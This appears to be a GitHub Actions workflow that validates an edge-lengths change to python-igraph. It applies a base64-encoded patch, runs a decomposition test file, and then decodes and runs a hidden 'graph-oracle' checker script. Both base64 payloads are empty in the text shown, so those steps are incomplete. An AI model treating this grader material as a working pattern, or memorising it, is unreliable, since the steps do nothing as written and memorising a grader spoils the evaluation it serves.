name: Validate edge-lengths algorithm
'on':
  workflow_dispatch: {}
permissions:
  contents: read
jobs:
  test:
    name: edge-lengths
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    steps:
    - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      with:
        repository: igraph/python-igraph
        ref: 1fff57221429057f8f253c5cd86b892c52e437db
        persist-credentials: false
    - name: Apply verified change
      shell: bash
      run: 'set -euo pipefail

        echo 
        | base64 -d | git apply -

        git diff --check'
    - uses: actions/setup-python@v5
      with:
        python-version: '3.11'
    - name: Run tests
      shell: bash
      run: 'set -euo pipefail

        export CMAKE_BUILD_PARALLEL_LEVEL=4

        git submodule update --init --depth 1

        python -m pip install . pytest pytest-timeout parameterized networkx

        python -m pytest -q tests/test_decomposition.py

        echo 
        | base64 -d > /tmp/graph-oracle.py

        python /tmp/graph-oracle.py

        '
